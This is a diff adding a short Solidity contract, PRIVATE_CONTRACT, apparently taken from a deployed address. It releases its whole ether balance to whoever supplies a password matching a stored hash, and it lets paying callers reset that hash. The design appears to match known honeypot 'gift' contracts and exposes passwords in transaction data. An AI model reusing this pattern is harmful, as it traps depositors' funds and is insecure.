@@ -1,0 +1,70 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract PRIVATE_CONTRACT at 0xD0981F1e922bE67F2D0Bb4f0c86F98F039DD24cc
+*/
+pragma solidity ^0.4.19;
+
+contract PRIVATE_CONTRACT
+{
+    function GetGift(bytes pass)
+    external
+    payable
+    {
+        if(hashPass == keccak256(pass))
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    function GetGift()
+    public
+    payable
+    {
+        if(msg.sender==reciver)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    bytes32 hashPass;
+    
+    bool closed = false;
+    
+    address sender;
+    
+    address reciver;
+ 
+    function GetHash(bytes pass) public pure returns (bytes32) {return keccak256(pass);}
+    
+    function SetPass(bytes32 hash)
+    public
+    payable
+    {
+        if( (!closed&&(msg.value > 1 ether)) || hashPass==0x00)
+        {
+            hashPass = hash;
+            sender = msg.sender;
+
+        }
+    }
+   
+    function SetReciver(address _reciver)
+    public
+    {
+        if(msg.sender==sender)
+        {
+            reciver = _reciver;
+        }
+    }
+    
+    function PassHasBeenSet(bytes32 hash)
+    public
+    {
+        if(hash==hashPass&&msg.sender==sender)
+        {
+           closed=true;
+        }
+    }
+    
+    function() public payable{}
+    
+}
